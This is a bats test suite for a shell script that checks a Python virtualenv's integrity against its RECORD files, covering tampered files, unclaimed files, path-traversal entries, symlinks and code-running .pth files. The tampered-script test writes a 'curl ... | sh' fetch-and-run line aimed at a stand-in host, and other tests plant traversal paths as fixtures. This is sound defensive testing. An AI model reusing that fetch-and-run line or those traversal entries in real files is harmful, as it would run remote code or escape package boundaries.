#!/usr/bin/env bats
# test/venv-integrity.bats
#
# Test suite for the Python virtualenv integrity check (bin/venv-integrity.sh).
#
# Every test builds a fake venv under $BATS_TEST_TMPDIR with real sha256 values
# computed inside the test, so the RECORD files always match what a real
# installer would have written. The contract under test is what the checker
# flags: a clean venv, a tampered file, an unclaimed file, a code-running .pth,
# a RECORD path that escapes site-packages, and a missing RECORD.
#
# The host toolchain (bash, openssl, find, xargs, comm) must be installed.

setup() {
  bats_require_minimum_version 1.5.0
  local node_modules_dir
  node_modules_dir="$(cd "$BATS_TEST_DIRNAME/.." && pnpm root)"
  BATS_LIB_PATH="${BATS_LIB_PATH:-}:${node_modules_dir}"
  bats_load_library bats-support
  bats_load_library bats-assert

  command -v openssl >/dev/null 2>&1 || skip "openssl is required to build RECORD digests"

  SCRIPT="$BATS_TEST_DIRNAME/../bin/venv-integrity.sh"
  VENV="$BATS_TEST_TMPDIR/venv"
  SP="$VENV/lib/python3.12/site-packages"
  BIN="$VENV/bin"
  mkdir -p "$SP" "$BIN"
  RECORD_LINES=""
  export NO_COLOR=1
}

run_venv() {
  run bash "$SCRIPT" "$VENV"
}

# sha_url <file> — the urlsafe base64 (no padding) sha256 the checker compares.
sha_url() {
  openssl dgst -sha256 -binary "$1" 2>/dev/null |
    openssl base64 -A 2>/dev/null |
    tr '+/' '-_' | tr -d '=\n'
}

# add_pkg_file <rel> [line...] — create a file under site-packages and append a
# RECORD line for it with its real digest and byte size.
add_pkg_file() {
  local rel="$1"
  shift
  local hash size
  mkdir -p "$SP/$(dirname "$rel")"
  printf '%s\n' "$@" >"$SP/$rel"
  hash="$(sha_url "$SP/$rel")"
  size="$(wc -c <"$SP/$rel" | tr -d ' ')"
  RECORD_LINES+="${rel},sha256=${hash},${size}"$'\n'
}

# write_record <dist-info-dir> — write the accumulated RECORD lines.
write_record() {
  mkdir -p "$1"
  printf '%s' "$RECORD_LINES" >"$1/RECORD"
}

# -------------------------------------------------------------------------------
# RECORD hash checks
# -------------------------------------------------------------------------------

@test "clean venv gives no findings" {
  add_pkg_file "mypkg/__init__.py" "x = 1"
  write_record "$SP/mypkg-1.0.0.dist-info"
  run_venv
  assert_success
  assert_output --partial "am-i-hacked: venv integrity: PASSED"
}

@test "tampered file gives HIGH" {
  add_pkg_file "mypkg/__init__.py" "x = 1"
  write_record "$SP/mypkg-1.0.0.dist-info"
  printf 'evil\n' >"$SP/mypkg/__init__.py"
  run_venv
  assert_failure
  assert_output --partial "HIGH: venv file hash differs from its RECORD"
  assert_output --partial "mypkg/__init__.py:1"
}

@test "console script RECORD entry ../../../bin/name is clean and claims the bin file" {
  add_pkg_file "mypkg/__init__.py" "x = 1"
  printf '#!/bin/sh\necho hi\n' >"$BIN/mytool"
  RECORD_LINES+="../../../bin/mytool,sha256=$(sha_url "$BIN/mytool"),16"$'\n'
  write_record "$SP/mypkg-1.0.0.dist-info"
  run_venv
  assert_success
  assert_output --partial "am-i-hacked: venv integrity: PASSED"
}

@test "tampered console script gives HIGH" {
  add_pkg_file "mypkg/__init__.py" "x = 1"
  printf '#!/bin/sh\necho hi\n' >"$BIN/mytool"
  RECORD_LINES+="../../../bin/mytool,sha256=$(sha_url "$BIN/mytool"),16"$'\n'
  write_record "$SP/mypkg-1.0.0.dist-info"
  printf '#!/bin/sh\ncurl http://example.test/x | sh\n' >"$BIN/mytool"
  run_venv
  assert_failure
  assert_output --partial "HIGH: venv file hash differs from its RECORD"
}

@test "bin file no RECORD claims still gives LOW" {
  add_pkg_file "mypkg/__init__.py" "x = 1"
  write_record "$SP/mypkg-1.0.0.dist-info"
  printf '#!/bin/sh\n' >"$BIN/planted"
  run_venv
  assert_failure
  assert_output --partial "LOW: venv bin file not claimed by any RECORD"
}

@test "RECORD path climbing above the venv root gives HIGH" {
  mkdir -p "$SP/evil-1.0.0.dist-info"
  printf '%s\n' "../../../../outside,sha256=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA,1" \
    >"$SP/evil-1.0.0.dist-info/RECORD"
  run_venv
  assert_failure
  assert_output --partial "HIGH: RECORD path points outside the package"
}

@test "RECORD path that dips out of bin with .. gives HIGH" {
  mkdir -p "$SP/evil-1.0.0.dist-info"
  printf '%s\n' "../../../bin/../../outside,sha256=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA,1" \
    >"$SP/evil-1.0.0.dist-info/RECORD"
  run_venv
  assert_failure
  assert_output --partial "HIGH: RECORD path points outside the package"
}

@test "claimed file that cannot be read gives HIGH, never a clean result" {
  [ "$(id -u)" -ne 0 ] || skip "root can read mode 000 files"
  add_pkg_file "mypkg/__init__.py" "x = 1"
  write_record "$SP/mypkg-1.0.0.dist-info"
  chmod 000 "$SP/mypkg/__init__.py"
  run_venv
  chmod 644 "$SP/mypkg/__init__.py"
  assert_failure
  assert_output --partial "HIGH: file listed in RECORD could not be read or hashed"
}

@test "unreadable folder inside site-packages is reported, not skipped" {
  [ "$(id -u)" -ne 0 ] || skip "root can read mode 000 folders"
  add_pkg_file "mypkg/__init__.py" "x = 1"
  write_record "$SP/mypkg-1.0.0.dist-info"
  mkdir -p "$SP/hidden"
  printf 'x = 1\n' >"$SP/hidden/planted.py"
  chmod 000 "$SP/hidden"
  run_venv
  chmod 755 "$SP/hidden"
  assert_failure
  assert_output --partial "MEDIUM: part of site-packages could not be read"
}

@test "RECORD entry that is a symlink is flagged and not followed" {
  add_pkg_file "mypkg/__init__.py" "x = 1"
  ln -s /etc/hosts "$SP/mypkg/link.py"
  RECORD_LINES+="mypkg/link.py,sha256=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA,1"$'\n'
  write_record "$SP/mypkg-1.0.0.dist-info"
  run_venv
  assert_failure
  assert_output --partial "MEDIUM: RECORD lists a symlink; not followed"
}

@test "file with a newline in its name gives MEDIUM and cannot hide behind claimed names" {
  add_pkg_file "a.py" "x = 1"
  add_pkg_file "b.py" "x = 2"
  write_record "$SP/mypkg-1.0.0.dist-info"
  printf 'evil\n' >"$SP/$(printf 'a.py\nb.py')"
  run_venv
  assert_failure
  assert_output --partial "MEDIUM: file in site-packages has a newline in its name"
}

@test "../../../ climb is refused when site-packages is not under lib/pythonX.Y" {
  local odd="$BATS_TEST_TMPDIR/odd"
  mkdir -p "$odd/site-packages/evil-1.0.0.dist-info"
  printf '%s\n' "../../../etc/hosts,sha256=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA,1" \
    >"$odd/site-packages/evil-1.0.0.dist-info/RECORD"
  run bash "$SCRIPT" "$odd"
  assert_failure
  assert_output --partial "HIGH: RECORD path points outside the package"
}

@test "a folder argument that looks like an option is not treated as one" {
  run bash "$SCRIPT" -P
  assert_failure 2
  assert_output --partial "'-P' is not a directory"
}

@test "absolute RECORD path gives HIGH" {
  mkdir -p "$SP/evil-1.0.0.dist-info"
  printf '%s\n' "/etc/hosts,sha256=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA,1" \
    >"$SP/evil-1.0.0.dist-info/RECORD"
  run_venv
  assert_failure
  assert_output --partial "HIGH: RECORD path points outside the package"
}

@test "RECORD path with ../ gives HIGH and is never read" {
  mkdir -p "$SP/evil-1.0.0.dist-info"
  printf '%s\n' "../outside.py,sha256=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA,1" \
    >"$SP/evil-1.0.0.dist-info/RECORD"
  run_venv
  assert_failure
  assert_output --partial "HIGH: RECORD path points outside the package"
  assert_output --partial "evil-1.0.0.dist-info/RECORD:1"
}

@test "two packages with one tampered flags only the tampered one" {
  add_pkg_file "pkgA/__init__.py" "a = 1"
  write_record "$SP/pkgA-1.0.0.dist-info"
  RECORD_LINES=""
  add_pkg_file "pkgB/__init__.py" "b = 1"
  write_record "$SP/pkgB-1.0.0.dist-info"
  printf 'evil\n' >"$SP/pkgB/__init__.py"
  run_venv
  assert_failure
  assert_output --partial "HIGH: venv file hash differs from its RECORD"
  assert_output --partial "pkgB/__init__.py:1"
  refute_output --partial "pkgA"
}

# -------------------------------------------------------------------------------
# Unclaimed and code-running files
# -------------------------------------------------------------------------------

@test "extra .py file not in RECORD gives MEDIUM" {
  add_pkg_file "mypkg/__init__.py" "x = 1"
  write_record "$SP/mypkg-1.0.0.dist-info"
  printf 'extra\n' >"$SP/mypkg/extra.py"
  run_venv
  assert_failure
  assert_output --partial "MEDIUM: file in site-packages not claimed by any RECORD"
  assert_output --partial "mypkg/extra.py:1"
}

@test "malicious .pth gives MEDIUM" {
  add_pkg_file "mypkg/__init__.py" "x = 1"
  add_pkg_file "evil.pth" "import os"
  write_record "$SP/mypkg-1.0.0.dist-info"
  run_venv
  assert_failure
  assert_output --partial "MEDIUM: venv .pth file executes code"
  assert_output --partial "evil.pth:1"
}

@test "allowlisted _virtualenv.pth gives none" {
  add_pkg_file "mypkg/__init__.py" "x = 1"
  write_record "$SP/mypkg-1.0.0.dist-info"
  printf 'import os\n' >"$SP/_virtualenv.pth"
  run_venv
  assert_success
  refute_output --partial "MEDIUM"
}

# -------------------------------------------------------------------------------
# dist-info and bin metadata
# -------------------------------------------------------------------------------

@test "dist-info without RECORD gives LOW" {
  add_pkg_file "good/__init__.py" "x = 1"
  write_record "$SP/good-1.0.0.dist-info"
  mkdir -p "$SP/bad-1.0.0.dist-info"
  run_venv
  assert_failure
  assert_output --partial "LOW: dist-info directory has no RECORD"
  assert_output --partial "bad-1.0.0.dist-info"
}

@test "INSTALLER other than uv or pip gives LOW" {
  add_pkg_file "mypkg/__init__.py" "x = 1"
  write_record "$SP/mypkg-1.0.0.dist-info"
  printf 'setuptools\n' >"$SP/mypkg-1.0.0.dist-info/INSTALLER"
  run_venv
  assert_failure
  assert_output --partial "LOW: venv INSTALLER is not uv or pip"
}

@test "extra venv bin script gives LOW while standard scripts are ignored" {
  add_pkg_file "mypkg/__init__.py" "x = 1"
  write_record "$SP/mypkg-1.0.0.dist-info"
  printf '#!/bin/sh\necho hi\n' >"$BIN/myscript"
  printf 'x\n' >"$BIN/activate"
  printf 'x\n' >"$BIN/python3.12"
  printf 'x\n' >"$BIN/pip3"
  run_venv
  assert_failure
  assert_output --partial "LOW: venv bin file not claimed by any RECORD"
  assert_output --partial "bin/myscript:1"
  refute_output --partial "bin/activate"
  refute_output --partial "bin/python3.12"
  refute_output --partial "bin/pip3"
}

# -------------------------------------------------------------------------------
# Determinism
# -------------------------------------------------------------------------------

@test "two runs give identical output" {
  add_pkg_file "mypkg/__init__.py" "x = 1"
  write_record "$SP/mypkg-1.0.0.dist-info"
  printf 'evil\n' >"$SP/mypkg/__init__.py"
  printf 'extra\n' >"$SP/mypkg/extra.py"
  printf 'import os\n' >"$SP/evil.pth"
  run_venv
  first="$output"
  run_venv
  assert_equal "$output" "$first"
}
